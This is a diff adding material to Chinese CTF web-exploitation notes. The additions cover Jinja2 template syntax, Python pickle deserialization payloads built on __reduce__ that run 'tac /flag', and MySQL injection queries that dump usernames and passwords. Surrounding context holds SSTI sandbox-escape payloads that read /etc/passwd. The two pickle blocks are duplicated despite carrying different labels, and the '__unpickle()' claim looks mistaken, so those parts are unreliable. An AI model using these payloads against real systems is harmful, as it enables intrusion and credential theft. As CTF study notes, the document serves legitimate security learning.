@@ -541,6 +541,23 @@ flask session 伪造需要用到私钥, `serect_key`; `serect_key`的值可通�
 
 ### SSTI 注入 (RCE 高危, 常见的 Python 漏洞)
 
+文档:
+```
+{% ... %} for Statements 
+
+{{ ... }} for Expressions to print to the template output
+
+{# ... #} for Comments not included in the template output
+
+#  ... # for Line Statements
+
+{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。
+{{}}用于将表达式打印到模板输出
+{##}表示未包含在模板输出中的注释
+##可以有和{%%}相同的效果
+```
+
+
 系统的认识 SSTI 注入:
 
 是一种利用 Web 应用程序的模板渲染机制执行恶意代码的安全漏洞
@@ -599,6 +616,50 @@ Tornado 模板允许执行任意 Python 表达式（比 Jinja2 更开放）：To
 - `request` + GET 传参绕过黑名单沙箱逃逸: `{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&a=__class__&b=__mro__&c=__subclasses__&d=read`
 
 - 无过滤无沙箱的情况下: `''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()` 读出 `/etc/passwd`
+
+### Python 反序列化
+
+原理和 PHP 反序列化是一样的, python 里这个叫魔术方法:
+
+> 这篇文章说的很好: [知乎文章](https://zhuanlan.zhihu.com/p/89132768)
+
+#### 从 php 出发去理解 python 反序列化
+
+Python 的反序列化依赖于 pickle 这个模块, 其底层的魔术方法是 `__unpickle()` 。 
+
+python 的序列化规则和 php 有所不同, 并不是把对象压成一个符合规范的 json 字符串, 而是一种类似反汇编语言的结构;
+
+#### 典型的利用(__reduce__)
+
+　　一种很流行的攻击思路是：利用 _`_reduce__` 构造恶意字符串，当这个字符串被反序列化的时候，`__reduce__` 会被执行。网上已经有海量的文章谈论这种方法，所以我们在这里不过多讨论。只给出一个例子：正常的字符串反序列化后，得到一个Student对象。我们想构造一个字符串，它在反序列化的时候，执行ls /指令。那么我们只需要这样得到payload：
+
+```python
+# 无 os
+import pickle
+import base64
+ 
+class A(object):
+    def \_\_reduce\_\_(self):
+        return (eval, ("\_\_import\_\_('os').popen('tac /flag').read()",))
+    
+a = A()
+a = pickle.dumps(a)
+print(base64.b64encode(a))
+```
+
+```python
+# 有 os
+import pickle
+import base64
+ 
+class A(object):
+    def \_\_reduce\_\_(self):
+        return (eval, ("\_\_import\_\_('os').popen('tac /flag').read()",))
+    
+a = A()
+a = pickle.dumps(a)
+print(base64.b64encode(a))
+```
 
 ## JS
 
@@ -812,6 +873,23 @@ SetHandler application/x-httpd-php
 
 ## sqli
 
+### 标准的mysql注入姿势
+
+```sql
+-- 先查库名
+SELECT DATABASE()
+
+--表名
+SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema='mydb'
+
+--列名
+SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name='users'
+-- 如果不止一个库里有 users 表，可能需要加上 AND table_schema='mydb'
+
+--具体数据项
+SELECT GROUP_CONCAT(username, ':', password) FROM users
+```
+
 ### 对 sqlite3 数据库的注入
 
 跟其他数据库结构略有不同:
@@ -856,7 +934,7 @@ sqlite_master 表的结构包含以下几个字段：
 #### 其余常用姿势
 
 通常回显都只有一行, 要吧所有的内容挤在一起, 就要用group concat()这个函数
-
+#
 
 #### 账号密码
 
